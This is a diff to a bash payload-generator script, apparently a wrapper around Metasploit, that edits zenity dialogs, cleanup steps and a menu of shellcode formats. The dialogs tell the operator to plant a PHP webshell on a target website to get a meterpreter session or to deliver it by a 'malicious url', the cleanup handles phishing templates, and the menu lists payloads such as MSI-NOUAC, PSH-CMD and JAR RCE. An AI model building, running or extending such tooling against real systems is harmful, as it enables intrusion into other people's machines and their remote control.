@@ -3239,7 +3239,7 @@ cd $IPATH/output
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and\nvisite the URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nOr use apache2 attack vector to deliver $N4m.php to target (trigger download)\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 330) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1
 
 
    if [ "$serv" = "multi-handler (default)" ]; then
@@ -3292,6 +3292,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 # CLEANING EVERYTHING UP
 echo "[☠] Cleanning temp generated files..."
 sleep 2
+mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -3370,7 +3371,7 @@ chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and\nvisite the URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nOr use apache2 attack vector to deliver $N4m.php\nto target (trigger download)\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 350) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1
 
 
    if [ "$serv" = "multi-handler (default)" ]; then
@@ -5092,7 +5093,7 @@ sh_exit () {
 
 # STORING DATABASE CONTENTS
 if [ "$RePoR" = "ON" ]; then
-xterm -T " STORING DATABASE CONTENTS " -geometry 110x23 -e "msfconsole -x 'makerc $IPATH/output/report.rc; exit -y'"
+xterm -T " STORING DATABASE CONTENTS " -geometry 110x23 -e "msfconsole -x 'db_import -f xml $IPATH/output/report; exit -y'"
 fi
 
 echo "[☠] Exit Console -> Stoping Services..."
@@ -5138,7 +5139,7 @@ cat << !
     |  3 - shellcode     windows      DLL            DLL          |
     |  4 - shellcode     windows      C              PYTHON,EXE   |
     |  5 - shellcode     windows      C              EXE          |
-    |  6   shellcode     windows      PSH-CMD        EXE          |
+    |  6 - shellcode     windows      PSH-CMD        EXE          |
     |  7 - shellcode     windows      C              RUBY         |
     |  8 - shellcode     windows      MSI-NOUAC      MSI          |
     |  9 - shellcode     windows      POWERSHELL     BAT          |
@@ -5148,7 +5149,7 @@ cat << !
     | 13 - shellcode     windows      VBS            VBS          |
     | 14 - shellcode     windows      PSH-CMD        VBS          |
     | 15 - shellcode     windows      PSH-CMD,C      PDF          |
-    | 16 - shellcode     webserver    PHP            PHP,PHP      |
+    | 16 - shellcode     webserver    PHP            PHP,PHP(b64) |
     | 17 - shellcode     multi OS     PYTHON         PYTHON       |
     | 18 - shellcode     multi OS     JAVA,PSH       JAR(RCE)     |
     | 19 - web_delivery  multi OS     PYTHON,PSH     PYTHON,BAT   |
